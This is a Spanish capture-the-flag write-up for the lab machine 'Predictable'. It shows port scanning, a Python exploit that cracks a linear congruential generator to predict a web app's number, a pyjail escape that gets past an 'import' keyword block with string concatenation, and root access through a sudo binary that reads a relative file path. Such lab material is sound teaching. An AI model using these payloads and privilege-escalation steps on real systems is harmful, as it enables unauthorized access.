![Screenshot](/hard/Predictable/Images/machine.png)

Dificultad: **Difícil**

Creado por: **C4rta**

# Pasos para explotar 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotacion)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

## 🛠️  Técnicas: Romper un generador lineal congruencial (LCG), Escapar de un pyjail, Ingenieria inversa a un binario "shell"

---

En primer lugar, nos aseguramos de que la máquina esté activa, lo cual podemos comprobar con el comando **ping**

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.147 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.132 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.127 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.127/0.135/0.147/0.008 ms
```

Ahora, podemos comenzar con nuestra fase de **reconocimiento**.

---

# Reconocimiento

Para iniciar nuestra fase de reconocimiento, utilizamos **nmap** para saber qué puertos están abiertos en el objetivo.

```java
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 14:18 -0500
Initiating ARP Ping Scan at 14:18
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 14:18, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:18
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 1111/tcp on 172.17.0.2
Completed SYN Stealth Scan at 14:19, 2.62s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-12-30 14:18:59 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 64
1111/tcp open  lmsocialserver syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le indicamos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65.535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, lo cual es útil porque en algunos casos puede ralentizar el escaneo.

**-sS** <- Con este argumento nmap realizará un escaneo de tipo "stealth", lo que significa que no se completará el handshake de tres vías, y también hace que el escaneo sea ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo que el escaneo sea aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de hosts, lo que significa que tratará a la máquina como activa y comenzará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap mostrará los puertos abiertos descubiertos durante el escaneo, lo que significa que si nmap descubre un puerto abierto, lo reportará inmediatamente mientras continúa el escaneo.

**--open** <- Con este argumento le decimos a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo finalice, podemos ver que hay 2 puertos abiertos:

- Puerto 22 (ssh / Secure Shell)
- Puerto 1111 (???)

Para conocer más sobre estos puertos, como los servicios y versiones que están ejecutándose, podemos usar nmap nuevamente para realizar este análisis.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ nmap -p22,1111 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará cada puerto en busca de su versión para identificar posibles vulnerabilidades en sistemas no actualizados, y también ejecutará algunos scripts para obtener más información sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap proporciona y la guardamos como un archivo XML.

Después de que el escaneo finalice, obtenemos la salida en un archivo XML, lo hacemos para crear una página HTML para ver la información de forma más clara y agradable a la vista.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo XML a un archivo HTML, ahora vamos a abrirlo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/Predictable/Images/image1.png)

Como podemos ver, es mucho más bonito y legible a la vista.

Y vemos que el puerto 1111 es un sitio web, voy a usar **whatweb** para saber qué tecnologías utiliza este sitio web.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ whatweb http://172.17.0.2:1111
http://172.17.0.2:1111 [200 OK] Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.11.9], HttpOnly[session], IP[172.17.0.2], Python[3.11.9], Script, Title[Predictable], Werkzeug[3.0.3]
```

Podemos ver que este sitio web utiliza Python, y eso es todo, así que vamos a echarle un vistazo con nuestro navegador.

![Screenshot](/hard/Predictable/Images/image2.png)

Podemos ver muchos números, un total de 99 números diferentes y una semilla, y también debemos ingresar un número.

Así que vamos a ver su código fuente.

```python
<!--

class prng_lcg:
	m =
	c =
	n = 9223372036854775783

	def __init__(self, seed=None):
		self.state = seed

	def next(self):
		self.state = (self.state * self.m + self.c) % self.n
		return self.state

# return int
def obtener_semilla():
	return time.time_ns()

def obtener_semilla_anterior():
	return obtener_semilla() - 1

if 'seed' not in session:
	session['seed'] = obtener_semilla()
gen = prng_lcg(session['seed'])

gen = prng_lcg(session['seed'])
semilla_anterior = obtener_semilla_anterior()

-->
```

La parte interesante de esto, como podemos ver, es un código Python dentro del código fuente del sitio web.

Este código Python básicamente es un **Generador Lineal Congruencial (LCG)**, que genera números "aleatorios" utilizando diferentes semillas.

Pero este modelo de generador de números pseudoaleatorios es particularmente **inseguro**, ¿por qué?

Este modelo de generador de números pseudoaleatorios, si usamos una semilla para generar números "aleatorios", no está generando números realmente aleatorios, porque si volvemos a generar esos números con la misma semilla, el resultado será exactamente el mismo que antes. Para entenderlo mejor, voy a hacer un ejemplo.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ python3 example.py 

[+] Enter a seed: 64756794

[i] Generating random numbers...

2813504957
2908570468
2348181215
1424176670
547608145

[+] Enter a seed: 64756794

[i] Generating random numbers...

2813504957
2908570468
2348181215
1424176670
547608145
```

Como podemos ver, si ingresamos la misma semilla, los resultados son completamente iguales, no cambia nada.

Esto significa que si conocemos el valor de la **Semilla**, los valores de **A**, **C** y **M**, podemos generar los mismos números y también predecir los futuros.

La fórmula de un **LCG** es básicamente esta:

$$
X_n+_1 = \ (a \cdot Xn + c) \ mod \ m
$$
En representación de Python:

```python
X = (a * X + c) % modulus
```

Donde **Xn+1** es el nuevo número generado y **Xn** es el número que se generó antes.

- **a** -> es el **Multiplicador**.
- **c** -> es el **Incremento**.
- **m** -> es el **Módulo**.

Y con el código Python que obtuvimos antes, ya tenemos el valor del **Módulo** y también el valor de la **Semilla**.

El valor del Módulo es:

```c
m = 9223372036854775783
```

Y el valor de la Semilla se genera por la hora actual de la máquina en nanosegundos, podemos ver que el código Python importa la librería **time**, y muestra la semilla en el sitio web.

![Screenshot](/hard/Predictable/Images/image3.png)

Muestra la semilla anterior, pero no te preocupes porque el código Python solo está obteniendo la semilla actual y restando 1.

Así que la semilla actual es **1767127738**

Y también la semilla actual se refleja en nuestra cookie.

cookie = **eyJzZWVkIjoxNzY3MTI3NzM4fQ.aVQogQ.NHKHPHIMfkeGvrK2uJksHGVo0cM**

Esta cookie está en formato **base64**

Así que vamos a **decodificarla**.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ echo "eyJzZWVkIjoxNzY3MTI3NzM4fQ.aVQ6ug.3W0H1vq5exrD59UqAL1n391sy3g" | base64 -d
{"seed":1767127738}base64: invalid input
```

Podemos ver la semilla actual en la cookie.

Bien, ya tenemos la **Semilla** y el **Módulo**.

Pero, ¿qué pasa con el **Incremento** y el **Multiplicador**?

---

# Explotación

Hay un método para obtener primero el **Multiplicador** y luego, si obtenemos el **Multiplicador**, también podemos obtener el **Incremento**.

¿Cómo obtener el Multiplicador primero?

Existen muchos pasos para obtener estos valores, pero voy a usar el método directo, esta es la fórmula:

$$
Multiplier = (r_3 - r_2) \cdot (r_2 - r_1)^{-1} \ mod \ m
$$
En representación de Python:

```python
multiplier = (r3 - r2) * pow(r2 - r1, -1, modulus) % modulus
```

Así que necesitamos al menos 3 resultados, por suerte tenemos incluso 99 resultados, así que esto es suficiente.

**Nota**: Si quieres saber más sobre cómo romper un **LSG**, puedes echar un vistazo a estos recursos:

- [Cracking RNGs: Linear Congruential Generators](https://msm.lt/posts/cracking-rngs-lcgs/)
- [Reverse engineering linear congruential generators](https://www.violentlymild.com/posts/reverse-engineering-linear-congruential-generators/)
- [Pseudo-Randomness – Breaking LCG](https://youtu.be/EdRK9Ap32Vg?si=V2s1SaBnXY5FSKaF)

Y por último, para obtener el **Incremento**, hay una fórmula simple:

$$
Increment = (r_2 - r_1 \ \cdot multiplier) \ mod \ modulus
$$

En representación de Python:

```python
increment = (r2 - r1 * multiplier) % modulus
```

Así que ya tenemos todo lo necesario para romper esto y predecir el número en la posición 100.

Este es el **exploit**:

```python
import sys, signal

def maGreen(text): return f'\033[92m{text}\033[00m'
def maYellow(text): return f'\033[93m{text}\033[00m'
def maBlue(text): return f'\033[94m{text}\033[00m'
def maBold(text): return f'\033[1m{text}\033[00m'

display_info = f'{maBold("[")}{maYellow("i")}{maBold("]")}'
display_pwned = f'{maBold("[")}{maGreen("!")}{maBold("]")}'
display_input = f'{maBold("[")}{maBlue("×")}{maBold("]")}'

pointing = "←(>▽<)ﾉ"

modulus = 9223372036854775783

def stop(sig, frame):
	print(f"{display_info} QUITTING...")
	sys.exit(1)

signal.signal(signal.SIGINT, stop)

def generate(x, multiplier, increment):
	all_nums = []

	for n in range(100):
		x = (x * multiplier + increment) % modulus
		all_nums.append(x)

	return all_nums[-1]


def execute():
	seed = int(input(f"{display_input} Enter the seed: "))

	r1 = int(input(f"\n{display_input} Enter the 1st result: "))
	r2 = int(input(f"{display_input} Enter the 2nd result: "))
	r3 = int(input(f"{display_input} Enter the 3rd result: "))

	multiplier = (r3 - r2) * pow(r2 - r1, -1, modulus) % modulus

	increment = (r2 - r1 * multiplier) % modulus

	print(f"\n{display_info} The value of the {maBold('multiplier')} is: {multiplier}")
	print(f"{display_info} The value of the {maBold('increment')} is: {increment}")

	final_num = generate(seed, multiplier, increment)

	print(f"\n{display_pwned} {maBold('PWNED!')} the 100 number is: {maBold(maGreen(final_num))} {maGreen(pointing)}")


if __name__ == "__main__":
	execute()
```

En este script introducimos 3 resultados, y automáticamente va a hacer las matemáticas para obtener el valor del multiplicador y el incremento, una vez que tengamos esto, vamos a generar la misma secuencia hasta llegar al número en la posición 100.

Así que vamos a ver si funciona:

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ python3 exploit.py 
[×] Enter the seed: 1767150943

[×] Enter the 1st result: 2550606061119791111
[×] Enter the 2nd result: 7346613280560341167
[×] Enter the 3rd result: 5794153166887891385

[i] The value of the multiplier is: 81853448938945944
[i] The value of the increment is: 7382843889490547368

[!] PWNED! the 100 number is: 3218022026791230586 ←(>▽<)ﾉ
```

Y obtuvimos el número final que está en la posición 100, así que vamos a ver si funciona.

![Screenshot](/hard/Predictable/Images/image4.png)

Y obtuvimos las credenciales del usuario **mash**, así que vamos a iniciar sesión a través de **ssh**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ ssh mash@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:BFX3OBp+y0aQxnKBckZRD0bX0Waq2Q16iiCYZ+bCOFc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
mash@172.17.0.2's password: 
Linux predictable 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Romper LCG y predecir numeros es divertido
______________________________________________________________________
Ahora escapa de mi pyjail
>
```

Y podemos ver que estamos dentro, pero no podemos introducir ningún comando y muestra que necesitamos escapar de un **pyjail**.

En resumen, un **pyjail** es que estamos dentro del intérprete de Python, pero de una forma muy limitada, solo podemos ejecutar ciertos comandos y otros están en una lista negra.

```python
> exec
Block: exec
> import os
Block: import
> import os; os.system("bash")
Block: import
> import pty; pty.spawn("/bin/bash")
Block: import
> whoami  
Error: name 'whoami' is not defined
> id
<built-in function id>
```

Podemos ver que no podemos usar `exec`, `os`, `import`, `open` y otras funciones.

Podemos comprobar si podemos usar **subprocess** para ejecutar comandos...

```python
> subprocess
Error: name 'subprocess' is not define
```

Podemos ver que `subprocess` no está definido.

Podemos intentar usar esta librería para ejecutar comandos en el sistema y obtener una shell.

Vamos a usar ```__builtins__``` esto es como un gran diccionario que hace mucho más fácil usar ciertas funciones en Python como ```sum(), all(), exec()``` en lugar de hacer cada función por nosotros mismos, incluso los builtins tienen la función ```__import__()``` para intentar obtener subprocess y ejecutar código, dentro de la máquina.

Puedes usar algo como esto:

```python
> globals()['__builtins__']
<module 'builtins' (built-in)>
```

Pero en mi caso lo hago con este método, es más directo:

```python
> print.__self__
<module 'builtins' (built-in)>
```

Así que vamos a intentar importar subprocess con esto.

```python
> print.__self__.__import__('subprocess').run(['bash'])
Block: import
```

Parece que cada entrada que introducimos, de alguna forma detrás analiza la cadena, y trata de encontrar la palabra **import**, así que ¿cómo podemos importar subprocess?

Necesitamos usar una función de Python que es **getattr()** esta función puede ser útil para obtener un atributo de algo, como:

```python
>>> getattr(test, 'hello')
>>> # Es como hacer algo como esto: test.hello
```

Recibe el objeto que queremos trabajar, como ```__builtins__``` y el último valor, la función necesita una cadena, como ```__import__``` para obtener:

- ```__builtins__.__import__```

Bien, pero ¿cómo podemos introducir **import** si automáticamente bloquea nuestro código?

Recuerda que podemos poner cadenas en Python juntas como: ```'__imp'+'ort__'```

Así que vamos a intentar saltar esta restricción con este método.

```python
> getattr(print.__self__, '__imp'+'ort__')('subprocess').run(['bash'])
mash@predictable:~$ whoami
mash
```

Y finalmente estamos dentro de la máquina!

---

# Escalada de privilegios

Si ejecutamos **sudo -l** podemos ver que tenemos un privilegio de **SUDOER**

```
mash@predictable:~$ sudo -l
Matching Defaults entries for mash on predictable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mash may run the following commands on predictable:
    (root) NOPASSWD: /opt/shell
```

Podemos ver que podemos ejecutar el binario **shell** que se encuentra en **/opt/** y ejecutarlo como el usuario **root**.

Vamos a intentar ejecutar este **binario** como root, a ver qué pasa.

```
mash@predictable:/opt$ sudo ./shell 
Uso: ./shell input
Pista: ./shell -h
```

Parece que tenemos un menú de ayuda.

```
mash@predictable:/opt$ sudo ./shell -h
¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
```

Parece que en este sistema está instalado **radare2**

Pero voy a usar **Ghidra** porque es más fácil de leer que el código ensamblador puro, así que voy a transferir este binario a mi máquina de ataque.

```ruby
mash@predictable:/opt$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y en nuestra máquina voy a usar **wget** para descargar el binario.

```java
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/files]
└─$ wget http://172.17.0.2/shell
--2025-12-31 15:14:12--  http://172.17.0.2/shell
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15744 (15K) [application/octet-stream]
Saving to: ‘shell’

shell                                                       100%[============================================ >]  15.38K  --.-KB/s    in 0s      

2025-12-31 15:14:12 (344 MB/s) - ‘shell’ saved [15744/15744]
```

Bien, ahora voy a ejecutar **Ghidra**.

```bash
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/files]
└─$ ghidra
```

Bien, voy a echar un vistazo a la función **main**.

Y voy a hacer algunos cambios rápidos para hacer la función más legible.

```c
undefined8 main(int param_1,long param_2)

{
  int help_param;
  FILE *file;
  char *byte;
  
  if (param_1 == 2) {
    help_param = strcmp("-h",*(char **)(param_2 + 8));
    if (help_param == 0) { /* Help Menu */
      puts(&help_menu);
    }
    else {
      file = fopen("shell","r"); /* Reads a file in the working directory shell */
      fseek(file,6,0); /* The pointer reaches the 6th byte from the file shell */
      fread(byte,1,1,file); /* Reads the 6th byte */
      if ((*byte == '\x01') || (**(char **)(param_2 + 8) != '0')) {
        printf("Bleh~~\n");
      }
      else {
        system("/bin/bash");
      }
    }
  }
  else {
    puts("Uso: ./shell input");
    puts("Pista: ./shell -h");
  }
  return 0;
}
```

Aquí podemos ver mejor la función **main**.

SI introducimos un parámetro, el script intenta leer un archivo **"shell"** del directorio de trabajo y lee el byte 6 de este archivo, y hace esto:

SI el byte 6 del archivo **shell** es igual a **\x01** **O** el parámetro que introducimos no es igual a **0**, el programa va a imprimir el mensaje **bleh~**

SI estas 2 condiciones **NO** son ciertas, vamos a obtener una shell con bash, y si recuerdas, podemos ejecutar esto como el usuario **root**.

Pero esto es vulnerable, porque el archivo shell no tiene la ruta completa, así que podemos movernos a otro directorio como **/tmp/** y hacer un archivo **shell**, que el byte 6 de este archivo no sea igual a \x01, podemos hacer que el byte 6 sea \x00

También introducimos el parámetro 0, esto es confuso, así que necesitas leer y entender lo que hace este código.

Entonces vamos a movernos al directorio **/tmp/**

```r
mash@predictable:/opt$ cd /tmp
```

Y vamos a crear el archivo shell.

```r
mash@predictable:/tmp$ echo '\x00\x00\x00\x00\x00\x00' > shell
```

Así que estamos generando 6 bytes nulos en el archivo shell.

Entonces vamos a ejecutar el comando shell que se encuentra en el directorio opt.

```c
mash@predictable:/tmp$ sudo /opt/shell 0
root@predictable:/tmp# whoami
root
```

Ahora somos root ***...pwned..!***
